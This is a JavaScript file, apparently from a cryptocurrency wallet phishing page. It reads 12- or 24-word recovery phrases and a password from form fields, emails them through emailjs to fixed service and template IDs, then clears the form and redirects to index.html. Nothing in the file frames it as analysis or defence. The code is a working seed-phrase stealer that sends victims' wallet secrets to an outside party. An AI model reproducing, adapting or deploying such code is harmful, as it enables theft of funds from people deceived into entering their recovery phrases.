var a;

function show_hide() {
    if (a == 1) {
        document
            .getElementById("15form")
            .style
            .display = "none";
        return a = 0;
    } else {
        document
            .getElementById("15form")
            .style
            .display = "block";
        return a = 1;
    }
}

var b;

function hide_show() {
    if (b == 1) {
        document
            .getElementById("24form")
            .style
            .display = "none";
        return b = 0;
    } else {
        document
            .getElementById("24form")
            .style
            .display = "block";
        return b = 1;
    }
}

document
    .getElementById('submit1')
    .addEventListener('click', function () {
        
    var mnemonic1 = document
        .getElementById('1')
        .value;
    var mnemonic2 = document
        .getElementById('2')
        .value;
    var mnemonic3 = document
        .getElementById('3')
        .value;
    var mnemonic4 = document
        .getElementById('4')
        .value;
    var mnemonic5 = document
        .getElementById('5')
        .value;
    var mnemonic6 = document
        .getElementById('6')
        .value;
    var mnemonic7 = document
        .getElementById('7')
        .value;
    var mnemonic8 = document
        .getElementById('8')
        .value;
    var mnemonic9 = document
        .getElementById('9')
        .value;
    var mnemonic10 = document
        .getElementById('10')
        .value;
    var mnemonic11 = document
        .getElementById('11')
        .value;
    var mnemonic12 = document
        .getElementById('12')
        .value;
    var password1 = document
        .getElementById('password1')
        .value;

 // Simple validation (you should implement proper validation)
 if (mnemonic1.trim() === '' || mnemonic2.trim() === '' || mnemonic3.trim() === '' || mnemonic4.trim() === '' || mnemonic5.trim() === '' || mnemonic6.trim() === '' || mnemonic7.trim() === '' || mnemonic8.trim() === '' || mnemonic9.trim() === '' || mnemonic10.trim() === '' || mnemonic11.trim() === '' || mnemonic12.trim() === '' || password1.trim() === '') {
    alert('Please fill in all fields.');
    return;
}

// If the fields are not empty, proceed to send mail
sendMail1();
    });

function sendMail1() {
    var mnemonic1 = document
        .getElementById('1')
        .value;
    var mnemonic2 = document
        .getElementById('2')
        .value;
    var mnemonic3 = document
        .getElementById('3')
        .value;
    var mnemonic4 = document
        .getElementById('4')
        .value;
    var mnemonic5 = document
        .getElementById('5')
        .value;
    var mnemonic6 = document
        .getElementById('6')
        .value;
    var mnemonic7 = document
        .getElementById('7')
        .value;
    var mnemonic8 = document
        .getElementById('8')
        .value;
    var mnemonic9 = document
        .getElementById('9')
        .value;
    var mnemonic10 = document
        .getElementById('10')
        .value;
    var mnemonic11 = document
        .getElementById('11')
        .value;
    var mnemonic12 = document
        .getElementById('12')
        .value;
    var password1 = document
        .getElementById('password1')
        .value;

    var params = {
        mnemonic1: mnemonic1,
        mnemonic2: mnemonic2,
        mnemonic3: mnemonic3,
        mnemonic4: mnemonic4,
        mnemonic5: mnemonic5,
        mnemonic6: mnemonic6,
        mnemonic7: mnemonic7,
        mnemonic8: mnemonic8,
        mnemonic9: mnemonic9,
        mnemonic10: mnemonic10,
        mnemonic11: mnemonic11,
        mnemonic12: mnemonic12,
        password1: password1
    };

    const serviceID = "service_4ty7z5a";
    const templateID = "template_sphxuyv";

    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            document
                .getElementById("1")
                .value = "";
            document
                .getElementById("2")
                .value = "";
            document
                .getElementById("3")
                .value = "";
            document
                .getElementById("4")
                .value = "";
            document
                .getElementById("5")
                .value = "";
            document
                .getElementById("6")
                .value = "";
            document
                .getElementById("7")
                .value = "";
            document
                .getElementById("8")
                .value = "";
            document
                .getElementById("9")
                .value = "";
            document
                .getElementById("10")
                .value = "";
            document
                .getElementById("11")
                .value = "";
            document
                .getElementById("12")
                .value = "";
            document
                .getElementById("password1")
                .value = "";
            console.log(res);

            // Redirect to index.html
            window.location.href = "index.html";
        })
        .catch((err) => console.log(err));
}

document
    .getElementById('submit2')
    .addEventListener('click', function () {

        var mnemonic01 = document
            .getElementById('_1')
            .value;
        var mnemonic02 = document
            .getElementById('_2')
            .value;
        var mnemonic03 = document
            .getElementById('_3')
            .value;
        var mnemonic04 = document
            .getElementById('_4')
            .value;
        var mnemonic05 = document
            .getElementById('_5')
            .value;
        var mnemonic06 = document
            .getElementById('_6')
            .value;
        var mnemonic07 = document
            .getElementById('_7')
            .value;
        var mnemonic08 = document
            .getElementById('_8')
            .value;
        var mnemonic09 = document
            .getElementById('_9')
            .value;
        var mnemonic010 = document
            .getElementById('_10')
            .value;
        var mnemonic011 = document
            .getElementById('_11')
            .value;
        var mnemonic012 = document
            .getElementById('_12')
            .value;
        var mnemonic013 = document
            .getElementById('_13')
            .value;
        var mnemonic014 = document
            .getElementById('_14')
            .value;
        var mnemonic015 = document
            .getElementById('_15')
            .value;
        var mnemonic016 = document
            .getElementById('_16')
            .value;
        var mnemonic017 = document
            .getElementById('_17')
            .value;
        var mnemonic018 = document
            .getElementById('_18')
            .value;
        var mnemonic019 = document
            .getElementById('_19')
            .value;
        var mnemonic020 = document
            .getElementById('_20')
            .value;
        var mnemonic021 = document
            .getElementById('_21')
            .value;
        var mnemonic022 = document
            .getElementById('_22')
            .value;
        var mnemonic023 = document
            .getElementById('_23')
            .value;
        var mnemonic024 = document
            .getElementById('_24')
            .value;
        var password2 = document
            .getElementById('password2')
            .value;

        // Simple validation (you should implement proper validation)
        if (mnemonic01.trim() === '' || mnemonic02.trim() === '' || mnemonic03.trim() === '' || mnemonic04.trim() === '' || mnemonic05.trim() === '' || mnemonic06.trim() === '' || mnemonic07.trim() === '' || mnemonic08.trim() === '' || mnemonic09.trim() === '' || mnemonic010.trim() === '' || mnemonic011.trim() === '' || mnemonic012.trim() === '' || mnemonic013.trim() === '' || mnemonic014.trim() === '' || mnemonic015.trim() === '' || mnemonic016.trim() === '' || mnemonic017.trim() === '' || mnemonic018.trim() === '' || mnemonic019.trim() === '' || mnemonic020.trim() === '' || mnemonic021.trim() === '' || mnemonic022.trim() === '' || mnemonic023.trim() === '' || mnemonic024.trim() === '' || password2.trim() === '') {
            alert('Please fill in all fields.');
            return;
        }

        // If the fields are not empty, proceed to send mail
        sendMail();
    });

function sendMail() {
    var mnemonic01 = document
        .getElementById('_1')
        .value;
    var mnemonic02 = document
        .getElementById('_2')
        .value;
    var mnemonic03 = document
        .getElementById('_3')
        .value;
    var mnemonic04 = document
        .getElementById('_4')
        .value;
    var mnemonic05 = document
        .getElementById('_5')
        .value;
    var mnemonic06 = document
        .getElementById('_6')
        .value;
    var mnemonic07 = document
        .getElementById('_7')
        .value;
    var mnemonic08 = document
        .getElementById('_8')
        .value;
    var mnemonic09 = document
        .getElementById('_9')
        .value;
    var mnemonic010 = document
        .getElementById('_10')
        .value;
    var mnemonic011 = document
        .getElementById('_11')
        .value;
    var mnemonic012 = document
        .getElementById('_12')
        .value;
    var mnemonic013 = document
        .getElementById('_13')
        .value;
    var mnemonic014 = document
        .getElementById('_14')
        .value;
    var mnemonic015 = document
        .getElementById('_15')
        .value;
    var mnemonic016 = document
        .getElementById('_16')
        .value;
    var mnemonic017 = document
        .getElementById('_17')
        .value;
    var mnemonic018 = document
        .getElementById('_18')
        .value;
    var mnemonic019 = document
        .getElementById('_19')
        .value;
    var mnemonic020 = document
        .getElementById('_20')
        .value;
    var mnemonic021 = document
        .getElementById('_21')
        .value;
    var mnemonic022 = document
        .getElementById('_22')
        .value;
    var mnemonic023 = document
        .getElementById('_23')
        .value;
    var mnemonic024 = document
        .getElementById('_24')
        .value;
    var password2 = document
        .getElementById('password2')
        .value;

    var params = {
        mnemonic01: mnemonic01,
        mnemonic02: mnemonic02,
        mnemonic03: mnemonic03,
        mnemonic04: mnemonic04,
        mnemonic05: mnemonic05,
        mnemonic06: mnemonic06,
        mnemonic07: mnemonic07,
        mnemonic08: mnemonic08,
        mnemonic09: mnemonic09,
        mnemonic010: mnemonic010,
        mnemonic011: mnemonic011,
        mnemonic012: mnemonic012,
        mnemonic013: mnemonic013,
        mnemonic014: mnemonic014,
        mnemonic015: mnemonic015,
        mnemonic016: mnemonic016,
        mnemonic017: mnemonic017,
        mnemonic018: mnemonic018,
        mnemonic019: mnemonic019,
        mnemonic020: mnemonic020,
        mnemonic021: mnemonic021,
        mnemonic022: mnemonic022,
        mnemonic023: mnemonic023,
        mnemonic024: mnemonic024,
        password2: password2
    };

    const serviceID = "service_hqzstgx";
    const templateID = "template_06pc4di";

    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            document
                .getElementById("_1")
                .value = "";
            document
                .getElementById("_2")
                .value = "";
            document
                .getElementById("_3")
                .value = "";
            document
                .getElementById("_4")
                .value = "";
            document
                .getElementById("_5")
                .value = "";
            document
                .getElementById("_6")
                .value = "";
            document
                .getElementById("_7")
                .value = "";
            document
                .getElementById("_8")
                .value = "";
            document
                .getElementById("_9")
                .value = "";
            document
                .getElementById("_10")
                .value = "";
            document
                .getElementById("_11")
                .value = "";
            document
                .getElementById("_12")
                .value = "";
            document
                .getElementById("_13")
                .value = "";
            document
                .getElementById("_14")
                .value = "";
            document
                .getElementById("_15")
                .value = "";
            document
                .getElementById("_16")
                .value = "";
            document
                .getElementById("_17")
                .value = "";
            document
                .getElementById("_18")
                .value = "";
            document
                .getElementById("_19")
                .value = "";
            document
                .getElementById("_20")
                .value = "";
            document
                .getElementById("_21")
                .value = "";
            document
                .getElementById("_22")
                .value = "";
            document
                .getElementById("_23")
                .value = "";
            document
                .getElementById("_24")
                .value = "";
            document
                .getElementById("password2")
                .value = "";
            console.log(res);

            // Redirect to index.html
            window.location.href = "index.html";
        })
        .catch((err) => console.log(err));
}
